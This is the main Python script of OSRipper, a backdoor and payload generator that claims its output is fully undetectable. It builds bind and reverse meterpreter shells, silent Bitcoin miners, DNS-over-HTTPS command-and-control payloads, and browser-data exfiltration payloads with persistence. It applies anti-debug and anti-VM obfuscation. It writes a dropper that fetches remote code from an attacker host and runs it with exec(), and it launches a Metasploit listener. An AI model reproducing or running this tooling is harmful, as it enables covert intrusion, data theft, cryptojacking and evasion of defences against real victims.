#!/usr/bin/env python3
"""
OSRipper - Advanced Payload Generator and Crypter
A sophisticated, fully undetectable (FUD) backdoor generator and crypter
that specializes in creating advanced payloads for penetration testing
and red team operations.

Version and author information are imported from the package __init__.py
"""

import os
import sys
import socket
import shutil
import subprocess
from .ripgrok import get_tunnels
from . import __version__, __author__

# Global variables
bind = 0
encrypted = False
reps = False
host = None
port = None
name = "payload"

def clear_screen():
    """Clear the terminal screen."""
    os.system("clear" if os.name == "posix" else "cls")

def display_logo():
    """Display a modern logo."""
    logo = f"""
    ┌─────────────────────────────────────────────────────────────────────────────┐
    │                            OSRipper v{__version__}                            │
    │                                                                             │
    │          ██████╗ ███████╗██████╗ ██╗██████╗ ██████╗ ███████╗██████╗         │
    │         ██╔═══██╗██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗        │
    │         ██║   ██║███████╗██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝        │
    │         ██║   ██║╚════██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗        │
    │         ╚██████╔╝███████║██║  ██║██║██║     ██║     ███████╗██║  ██║        │
    │          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝        │
    │                                                                             │
    │                    Advanced Payload Generator & Crypter                    │
    │                           Fully Undetectable (FUD)                         │
    │                                                                             │
    └─────────────────────────────────────────────────────────────────────────────┘
    """
    print(logo)

def display_menu():
    """Display the main menu."""
    menu = f"""
    ┌─────────────────────────────────────────────────────────────────────────────┐
    │                           OSRipper v{__version__} Menu                           │
    ├─────────────────────────────────────────────────────────────────────────────┤
    │                                                                             │
    │  1. Create Bind Backdoor                                                   │
    │     └─ Opens a port on victim machine and waits for connection             │
    │                                                                             │
    │  2. Create Encrypted TCP Meterpreter (RECOMMENDED)                         │
    │     └─ Reverse connection with SSL/TLS encryption                          │
    │                                                                             │
    │  3. Crypt Custom Code                                                      │
    │     └─ Obfuscate and encrypt existing Python scripts                       │
    │                                                                             │
    │  ═══════════════════════════════ Miners ═══════════════════════════════════ │
    │                                                                             │
    │  4. Create Silent BTC Miner                                                │
    │     └─ Stealthy cryptocurrency mining payload                              │
    │                                                                             │
    │  ══════════════════════════ Staged Payloads ══════════════════════════════ │
    │                                                                             │
    │  5. Create Encrypted Meterpreter (Staged)                                  │
    │     └─ Multi-stage web delivery with enhanced stealth                      │
    │                                                                             │
    │  ══════════════════════════ DoH C2 Payloads ═════════════════════════════ │
    │                                                                             │
    │  6. Create DNS-over-HTTPS C2 Payload                                       │
    │     └─ Stealthy DoH-based C2 with web UI                                    │
    │                                                                             │
    │  ════════════════════════ Browser Extraction ════════════════════════════ │
    │                                                                             │
    │  7. Create Browser Exfiltration Payload                                    │
    │     └─ Windows / Linux / WSL2 / Android data extraction                    │
    │                                                                             │
    └─────────────────────────────────────────────────────────────────────────────┘
    """
    print(menu)

def validate_port(port_str):
    """Validate port number."""
    try:
        port_num = int(port_str)
        return 1024 <= port_num <= 65535
    except ValueError:
        return False

def validate_ip(ip):
    """Validate IP address."""
    try:
        # Check that IP has exactly 4 octets
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        # Validate each octet is a number between 0-255
        for part in parts:
            num = int(part)
            if not (0 <= num <= 255):
                return False
        # Also use socket.inet_aton for additional validation
        socket.inet_aton(ip)
        return True
    except (OSError, ValueError):
        return False

def get_user_input(prompt, validator=None, error_msg="Invalid input"):
    """Get validated user input."""
    while True:
        try:
            user_input = input(prompt).strip()
            if not user_input:
                continue
            if validator is None or validator(user_input):
                return user_input
            print(f"[!] {error_msg}")
        except KeyboardInterrupt:
            print("\n\nGoodbye!")
            sys.exit(0)

def listen(host, port):
    """Original listen function for bind backdoors."""
    SERVER_HOST = host
    SERVER_PORT = int(port)
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        parts = output.split(SEPARATOR, 1)
        if len(parts) != 2:
            print("[!] Invalid response from client")
            continue
        results, cwd = parts
        print(results)
    
    client_socket.close()
    s.close()

def gen_bind():
    """Generate bind backdoor."""
    global port, bind, name
    from .generator import create_bind_payload
    
    print("\nBind Backdoor Generator")
    print("─" * 40)
    
    name = "payload"
    port = get_user_input(
        "Enter port number (1024-65535): ",
        validate_port,
        "Port must be between 1024 and 65535"
    )
    bind = "1"
    
    # Stealth delay option
    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use centralized generator
    create_bind_payload(port, name, stealth_delay=stealth_delay)
    
    print(f"[+] Bind backdoor generated: {name}")
    print(f"[*] Listening on port: {port}")
    if stealth_delay:
        print("[*] Stealth delay enabled (5-15 seconds)")
    print("[i] Use 'python/meterpreter/bind_tcp' in Metasploit to connect")

def gen_rev_ssl_tcp():
    """Generate reverse SSL TCP meterpreter."""
    global name, host, port
    from .generator import create_reverse_ssl_tcp_payload
    
    print("\nEncrypted TCP Meterpreter Generator")
    print("─" * 45)
    
    name = "payload"
    
    use_ngrok = get_user_input(
        "Use ngrok port forwarding? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    if use_ngrok:
        port = get_user_input(
            "Enter local port (1024-65535): ",
            validate_port,
            "Port must be between 1024 and 65535"
        )
        
        print(f"[*] Starting ngrok tunnel on port {port}")
        print("Please run this command in another terminal:")
        print(f"   ngrok tcp {port}")
        input("Press Enter when ngrok is ready...")
        
        try:
            tunnel_info = get_tunnels()
            host, port = tunnel_info.split(":")
            print(f"[+] Ngrok tunnel established: {host}:{port}")
        except Exception as e:
            print(f"[!] Ngrok setup failed: {e}")
            use_ngrok = False
    
    if not use_ngrok:
        host = get_user_input(
            "Enter callback IP address: ",
            validate_ip,
            "Invalid IP address format"
        )
        port = get_user_input(
            "Enter callback port (1024-65535): ",
            validate_port,
            "Port must be between 1024 and 65535"
        )
    
    # Stealth delay option
    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use centralized generator
    create_reverse_ssl_tcp_payload(host, port, name, stealth_delay=stealth_delay)
    
    print(f"[+] Reverse TCP meterpreter generated: {name}")
    print(f"[*] Callback: {host}:{port}")
    if stealth_delay:
        print("[*] Stealth delay enabled (5-15 seconds)")

def gen_custom():
    """Generate custom crypter."""
    global name
    from .generator import create_custom_payload
    
    print("\nCustom Code Crypter")
    print("─" * 25)
    
    script_path = get_user_input(
        "Enter path to Python script to encrypt: ",
        lambda x: os.path.isfile(x) and x.endswith('.py'),
        "File not found or not a Python script"
    )
    
    name = "payload"
    
    # Stealth delay option
    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use centralized generator
    create_custom_payload(script_path, name, stealth_delay=stealth_delay)
    
    print(f"[+] Custom script processed: {name}")
    if stealth_delay:
        print("[*] Stealth delay enabled (5-15 seconds)")

def gen_btc_miner():
    """Generate Bitcoin miner."""
    global name
    from .generator import create_btc_miner_payload
    
    print("\nSilent BTC Miner Generator")
    print("─" * 35)
    
    name = "payload"
    btc_address = get_user_input(
        "Enter Bitcoin payout address: ",
        lambda x: len(x) >= 26 and len(x) <= 35,
        "Invalid Bitcoin address format"
    )
    
    # Stealth delay option
    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use centralized generator
    create_btc_miner_payload(btc_address, name, stealth_delay=stealth_delay)
    
    print(f"[+] BTC miner generated: {name}")
    print(f"[*] Payout address: {btc_address}")
    if stealth_delay:
        print("[*] Stealth delay enabled (5-15 seconds)")
    print("[i] Monitor at: https://solo.ckpool.org/")

def gen_doh():
    """Generate DNS-over-HTTPS C2 payload."""
    global name
    from .generator import create_doh_payload
    
    print("\nDNS-over-HTTPS C2 Payload Generator")
    print("─" * 45)
    
    name = "payload"
    domain = get_user_input(
        "Enter C2 domain name (e.g., example.com): ",
        lambda x: len(x) > 0 and '.' in x,
        "Invalid domain format"
    )
    
    # Stealth delay option
    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use centralized generator
    create_doh_payload(domain, name, stealth_delay=stealth_delay)
    
    print(f"[+] DoH payload generated: {name}")
    print(f"[*] C2 Domain: {domain}")
    if stealth_delay:
        print("[*] Stealth delay enabled (5-15 seconds)")

def gen_exfil():
    """Generate browser data extraction payload."""
    global name
    from .generator import create_exfil_payload

    print("\nBrowser Data Extraction Payload Generator")
    print("─" * 50)

    plat = get_user_input(
        "Select platform (windows/linux/wsl2/android): ",
        lambda x: x.lower() in ('windows', 'linux', 'wsl2', 'android'),
        "Choose: windows, linux, wsl2, or android"
    ).lower()

    c2_mode = get_user_input(
        "C2 mode — telegram / c2 / dual: ",
        lambda x: x.lower() in ('telegram', 'c2', 'dual'),
        "Choose: telegram, c2, or dual"
    ).lower()

    bot_token = chat_id = c2_url = ''

    if c2_mode in ('telegram', 'dual'):
        bot_token = get_user_input("Enter Telegram bot token: ")
        chat_id = get_user_input("Enter Telegram chat ID: ")

    if c2_mode in ('c2', 'dual'):
        c2_url = get_user_input(
            "Enter OSRipper C2 URL (e.g. https://c2.example.com:5000): ")

    check_interval = int(get_user_input(
        "Auto-extraction interval in seconds (0=disabled, default=3600): ",
        lambda x: x.isdigit(), "Enter a number"
    ) or '3600')

    auto_persist = get_user_input(
        "Install persistence? (y/n): ",
        lambda x: x.lower() in ('y', 'n', 'yes', 'no'),
        "Enter y or n"
    ).lower() in ('y', 'yes')

    root_mode = False
    if plat == 'android':
        root_mode = get_user_input(
            "Enable root mode? (y/n): ",
            lambda x: x.lower() in ('y', 'n', 'yes', 'no'),
            "Enter y or n"
        ).lower() in ('y', 'yes')

    stealth_delay = get_user_input(
        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
        lambda x: x.lower() in ('y', 'n', 'yes', 'no'),
        "Enter y or n"
    ).lower() in ('y', 'yes')

    name = "payload"
    create_exfil_payload(
        target_platform=plat, output_name=name,
        bot_token=bot_token, chat_id=chat_id,
        c2_url=c2_url, c2_mode=c2_mode,
        check_interval=check_interval, auto_persist=auto_persist,
        root_mode=root_mode, stealth_delay=stealth_delay,
    )

    print(f"\n[+] Exfil payload generated: {name}")
    print(f"[*] Platform: {plat}")
    print(f"[*] C2 mode:  {c2_mode}")
    if stealth_delay:
        print("[*] Stealth delay enabled")


def postgen():
    """Handle post-generation options."""
    global encrypted
    
    print("\nPost-Generation Options")
    print("─" * 30)
    
    # Obfuscation
    obfuscate = get_user_input(
        "Obfuscate payload? (recommended) (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Enhanced obfuscation (only if obfuscation is enabled)
    enhanced_obfuscation = False
    if obfuscate:
        enhanced_obfuscation = get_user_input(
            "Use enhanced obfuscator? (anti-debug, VM detection, advanced evasion) (y/n): ",
            lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
            "Please enter 'y' or 'n'"
        ).lower() in ['y', 'yes']
    
    # Compilation
    compile_binary = get_user_input(
        "Compile to binary? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    # Use Generator for obfuscation and/or compilation
    if obfuscate or compile_binary:
        try:
            from .generator import Generator
            
            # Get icon path if compiling
            icon_path = None
            if compile_binary:
                icon_input = input("Enter .ico path for custom icon (or press Enter for default): ").strip()
                if icon_input and os.path.exists(icon_input):
                    icon_path = icon_input
            
            # Initialize generator
            source_file = f"{name}.py" if os.path.exists(f"{name}.py") else name
            generator = Generator(source_file, name, icon_path)
            
            # Run generation
            success = generator.generate(
                obfuscate=obfuscate,
                compile_binary=compile_binary,
                enhanced_obfuscation=enhanced_obfuscation
            )
            
            if success:
                encrypted = obfuscate
            else:
                print("[!] Generation failed")
                
        except Exception as e:
            print(f"[!] Generation error: {e}")
            import traceback
            traceback.print_exc()


def start_web_server(webroot):
    """Start web server for staged payloads."""
    try:
        cmd = ["python3", "-m", "http.server", "8000", "--directory", webroot]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[*] Web server started in background on port 8000")
    except Exception as e:
        print(f"[!] Failed to start web server: {e}")

def webdelivery():
    """Create web delivery dropper."""
    with open("dropper.py", "w") as f:
        dropper_code = f'''
import requests
import time
import random

def download_and_execute():
    try:
        url = "http://{host}:8000/{name}_or.py"
        time.sleep(random.randint(1, 10))
        
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            exec(response.text)
        else:
            time.sleep(300)
            download_and_execute()
    except Exception:
        time.sleep(300)
        download_and_execute()

if __name__ == "__main__":
    download_and_execute()
'''
        f.write(dropper_code)
    
    # Obfuscate dropper
    try:
        from . import obfuscator
        obfuscator.MainMenu("dropper.py")
    except Exception:
        pass
    
    # Compile dropper (use venv python if osripper-cli setup was run)
    try:
        try:
            from osripper.venv_helper import get_venv_python
            python = get_venv_python()
        except Exception:
            python = "python3"
        result = subprocess.run(
            [
                python, "-m", "nuitka", "--standalone", "--include-module=sandboxed",
                "--disable-console", "--onefile", "--assume-yes-for-downloads", "dropper_or.py"
            ],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            err = (result.stderr or result.stdout or "")
            if "No module named" in err or "nuitka" in err:
                print("[!] Dropper compilation skipped. Run: osripper-cli setup")
    except Exception:
        pass


def start_listener():
    """Start Metasploit listener."""
    if not bind and host and port:
        try:
            print("[*] Starting Metasploit listener...")
            cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'"
            os.system(cmd)
        except Exception as e:
            print(f"[!] Failed to start listener: {e}")
            print(f"[i] Manually run: msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'")

def main():
    """Main application."""
    try:
        from .venv_helper import ensure_venv_on_path
        ensure_venv_on_path()
        clear_screen()
        display_logo()
        display_menu()
        
        choice = get_user_input(
            "\n[?] Select module (1-7): ",
            lambda x: x in ['1', '2', '3', '4', '5', '6', '7'],
            "Please select a valid option (1-7)"
        )
        
        print(f"\n[*] Executing module {choice}...")
        
        if choice == '1':
            gen_bind()
            postgen()
            print("\n[i] Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
            
        elif choice == '2':
            gen_rev_ssl_tcp()
            postgen()
            start_listener()
            
        elif choice == '3':
            gen_custom()
            postgen()
            
        elif choice == '4':
            gen_btc_miner()
            postgen()
            
        elif choice == '5':
            gen_rev_ssl_tcp()
            postgen()
            
            # Move to webroot and start server
            os.makedirs("webroot", exist_ok=True)
            payload_file = f"{name}_or.py" if encrypted else f"{name}.py"
            if os.path.exists(payload_file):
                shutil.move(payload_file, f"webroot/{payload_file}")
            
            webdelivery()
            start_web_server("webroot")
            start_listener()
        
        elif choice == '6':
            gen_doh()
            postgen()
            print("\n[i] Start C2 server with: python -m osripper.c2.server <domain>")
            print("[i] Web UI will be available at: http://localhost:5000")
        
        elif choice == '7':
            gen_exfil()
            postgen()
            print("\n[i] Deploy the payload on the target platform")
            print("[i] For C2 mode, start the C2 server first: osripper-cli server <domain>")
        
        print("\n[+] Operation completed successfully!")
        print("[*] Check the 'results' directory for your files")
        
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
    finally:
        print("\nThanks for using OSRipper!")

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 6):
        print("[!] Python 3.6 or higher is required")
        sys.exit(1)
    
    main()
